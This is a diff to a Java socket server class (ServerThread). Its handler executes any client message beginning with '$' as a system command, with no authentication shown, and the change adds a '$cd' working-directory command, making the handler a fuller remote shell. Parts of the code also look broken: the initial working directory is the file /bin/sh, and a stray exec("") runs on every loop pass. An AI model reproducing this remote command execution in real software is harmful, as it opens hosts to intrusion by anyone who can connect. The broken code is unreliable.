@@ -6,6 +6,7 @@ import java.io.*;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
+import java.util.Locale;
 
 /**
  * 该类为多线程类，用于服务端
@@ -64,6 +65,7 @@ public class ServerThread extends BaseServiceImpl implements Runnable{
             socket.setSoTimeout(10000);
             out.println("欢迎回来，连接已建立，通信地址：" + socket.getRemoteSocketAddress());
             boolean flag = true;
+            File current = new File("/bin/sh");
             while (flag && !socket.isClosed()) {
                     Runtime.getRuntime().exec("");
                 try {
@@ -85,9 +87,15 @@ public class ServerThread extends BaseServiceImpl implements Runnable{
                     out.println(CONNECTTEST_RESPONSE);
                 }else if(CONNECTTEST_RESPONSE.equals(str)){
                     connectTag = 0;
+                }else if(str.startsWith("$cd")){
+                    String path = str.substring(3).trim();
+                    File file = new File(path);
+                    if(file.exists()){
+                        current = file;
+                    }
                 }else if(str.startsWith("$")){
                     try{
-                        InputStream inputStream = Runtime.getRuntime().exec(str.substring(1)).getInputStream();
+                        InputStream inputStream = Runtime.getRuntime().exec(str.substring(1),null,current).getInputStream();
                     }catch (Exception e){
 
                     }
